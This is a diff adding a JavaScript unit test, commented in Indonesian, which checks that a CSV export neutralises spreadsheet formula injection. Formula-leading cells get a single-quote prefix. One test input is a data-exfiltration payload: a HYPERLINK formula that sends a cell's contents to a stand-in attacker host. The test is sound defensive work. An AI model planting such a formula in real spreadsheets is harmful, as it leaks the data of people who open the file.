@@ -26,6 +26,17 @@ describe("bentuk CSV", () => {
     const csv = toCsv([["a", "b;c"], ['kata "kunci"', "dua\nbaris"], [null, 3]]);
     assert.equal(csv, '﻿a;"b;c"\r\n"kata ""kunci""";"dua\nbaris"\r\n;3\r\n');
   });
+
+  test("teks yang diawali tanda formula dilumpuhkan, angka dibiarkan", () => {
+    // Kolom identitas & saran diisi responden publik tanpa akun; tanpa awalan kutip tunggal, Excel
+    // menjalankan isinya sebagai formula begitu Admin membuka berkasnya.
+    const csv = lines(toCsv([["=1+1", "+1"], ["-2+3", "@SUM(A1)"], [-5, 3]]));
+    assert.deepEqual(csv, ["'=1+1;'+1", "'-2+3;'@SUM(A1)", "-5;3"]);
+
+    // Yang paling berbahaya: formula yang menarik data keluar. Harus tetap jadi teks.
+    const jahat = toCsv([['=HYPERLINK("http://jahat.contoh/?x"&A1,"klik")']]);
+    assert.ok(jahat.includes(`'=HYPERLINK`), jahat);
+  });
 });
 
 describe("matriks", () => {
